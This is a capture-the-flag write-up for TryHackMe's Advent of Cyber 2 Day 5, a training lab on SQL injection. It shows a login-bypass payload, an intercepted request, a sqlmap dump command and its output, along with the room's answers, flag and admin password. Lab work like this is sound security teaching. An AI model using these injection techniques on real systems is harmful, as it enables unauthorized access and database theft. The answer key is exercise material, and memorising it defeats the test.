# TryHackMe [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2) Day 5
### References
* DarkSec. (2020). TryHackMe Advent of Cyber 2: Day 5 [YouTube Video]. In YouTube. https://youtu.be/Kitx7cSNsuE

## Without using directory brute forcing, what's Santa's secret login panel?
* Hint:
> The name is derived out of 2 words from this question. `/s**tap***l`

**Answer**: `/santapanel`

## Visit Santa's secret login panel and bypass the login using SQLi
1. Access the sing-in page from the address `http://10.10.30.88:8000/santapanel`
2. Use the username of `admin' or 1=1--` and any password

## How many entries are there in the gift database?
1. By using BurpSuite, we can intercept the search request and modify it for `sqlmap`:
```http
GET /santapanel?search=AppleGamer22 HTTP/1.1
Host: 10.10.30.88:8000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.30.88:8000/santapanel
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=eyJhdXRoIjp0cnVlfQ.YVBR5A.VXiLxJfhJkAJWz7UbczWaIrBYTk
Connection: close
```
2. `sqlmap` enumeration:
```bash
$ sqlmap -r request.txt --tamper=space2comment --dump-all --dbms sqlite
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: search=AppleGamer22 UNION ALL SELECT CHAR(113,112,106,118,113)||CHAR(65,109,85,83,77,77,100,75,88,88,90,113,106,71,99,78,86,113,76,87,74,117,81,118,67,85,113,90,100,97,115,73,115,111,78,81,83,113,102,83)||CHAR(113,120,113,122,113),NULL-- imHD
---
Database: <current>
Table: sequels
[22 entries]
+-------------+-----+----------------------------+
| kid         | age | title                      |
+-------------+-----+----------------------------+
| James       | 8   | shoes                      |
| John        | 4   | skateboard                 |
| Robert      | 17  | iphone                     |
| Michael     | 5   | playstation                |
| William     | 6   | xbox                       |
| David       | 6   | candy                      |
| Richard     | 9   | books                      |
| Joseph      | 7   | socks                      |
| Thomas      | 10  | 10 McDonalds meals         |
| Charles     | 3   | toy car                    |
| Christopher | 8   | air hockey table           |
| Daniel      | 12  | lego star wars             |
| Matthew     | 15  | bike                       |
| Anthony     | 3   | table tennis               |
| Donald      | 4   | fazer chocolate            |
| Mark        | 17  | wii                        |
| Paul        | 9   | github ownership           |
| James       | 8   | finnish-english dictionary |
| Steven      | 11  | laptop                     |
| Andrew      | 16  | rasberry pie               |
| Kenneth     | 19  | TryHackMe Sub              |
| Joshua      | 12  | chair                      |
+-------------+-----+----------------------------+
Database: <current>
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All_I_Want_for_Christmas_Is_You} |
+-----------------------------------------+
Database: <current>
Table: users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| EhCNSWzzFP6sc7gB | admin    |
+------------------+----------+
```

**Answer**: `22`
## What did Paul ask for?
**Answer**: `github ownership`
## What is the flag?
**Answer**: `thmfox{All_I_Want_for_Christmas_Is_You}`
## What is admin's password?
**Answer**: `EhCNSWzzFP6sc7gB`